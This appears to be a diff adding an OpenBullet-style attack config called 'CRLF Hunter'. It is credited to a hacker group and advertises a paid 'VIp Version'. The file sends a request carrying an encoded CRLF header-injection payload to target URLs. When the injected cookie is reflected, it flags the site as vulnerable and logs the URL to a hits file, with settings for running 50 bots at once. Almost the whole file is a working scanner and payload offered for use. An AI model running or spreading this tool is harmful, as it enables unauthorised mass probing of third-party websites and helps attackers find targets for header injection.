@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "CRLF[HuNTEr]",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-10-08T10:53:43.8647608+01:00",
+  "AdditionalInfo": "CRLF Hunter Free !*_*! Contact @mar2_alpha for VIp Version !*_*! our group: @GreyH4tHackers",
+  "RequiredPlugins": [],
+  "Author": "l4gtr4",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": true,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://<URL>/%0Aset-cookie:%20hello=l4gtr4;" 
+  
+  HEADER "Connection: Keep-alive" 
+  HEADER "Accept-Encoding: gzip,deflate" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21" 
+  HEADER "Accept: /" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<HEADERS(*)>" DoesNotContain "l4gtr4" 
+    KEY "<COOKIES(*)>" DoesNotContain "l4gtr4" 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS(*)>" Contains "l4gtr4" 
+    KEY "<COOKIES(*)>" Contains "l4gtr4" 
+
+PARSE "" LR "" "" CreateEmpty=FALSE -> CAP "" "" "!^~^! Target maybe Vulnerable to CRLF Injection !^~^!" 
+
+UTILITY File "CRLF.txt" AppendLines "https://<URL>/%0Aset-cookie:%20hello=l4gtr4;" 
+
